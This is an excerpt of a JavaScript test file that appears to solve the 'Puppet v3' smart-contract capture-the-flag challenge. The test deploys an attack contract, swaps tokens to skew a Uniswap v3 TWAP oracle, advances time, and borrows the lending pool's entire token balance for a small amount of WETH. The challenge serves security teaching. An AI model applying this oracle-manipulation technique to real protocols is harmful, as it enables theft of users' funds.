...
describe("[Challenge] Puppet v3", function () {
  ...
  /** SET RPC URL HERE */
  const MAINNET_FORKING_URL = RPC_URL;
  console.log("Forking from", MAINNET_FORKING_URL);
  ...
  before(async function () {
    ...
    expect(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)).to.be.eq(
  ...
  it("Execution", async function () {
    ...
    const Attack14 = await ethers.getContractFactory("Attack14", deployer);
    const attack14 = await Attack14.deploy(lendingPool.address, token.address, weth.address, player.address);

    // Transfer all tokens to attack contract & swap them for WETH
    await token.connect(player).transfer(attack14.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await attack14.connect(player).attack1();

    // Increase time by 100 seconds to allow TWAP update
    await time.increase(100);

    // Borrow all DVT from lending pool for very small amount of WETH
    await attack14.connect(player).attack2();

    // Log pool and player balances
    const balancePool = await token.balanceOf(lendingPool.address);
    const balancePlayer = await token.balanceOf(player.address);
    const ethPool = await ethers.provider.getBalance(lendingPool.address);
    const ethPlayer = await ethers.provider.getBalance(player.address);
    console.log({
      balancePool: formatEther(balancePool),
      ethPool: formatEther(ethPool),
      balancePlayer: formatEther(balancePlayer),
      ethPlayer: formatEther(ethPlayer),
    });
  });
  ...
  after(async function () {
    ...
    expect((await ethers.provider.getBlock("latest")).timestamp - initialBlockTimestamp).to.be.lt(
      115,
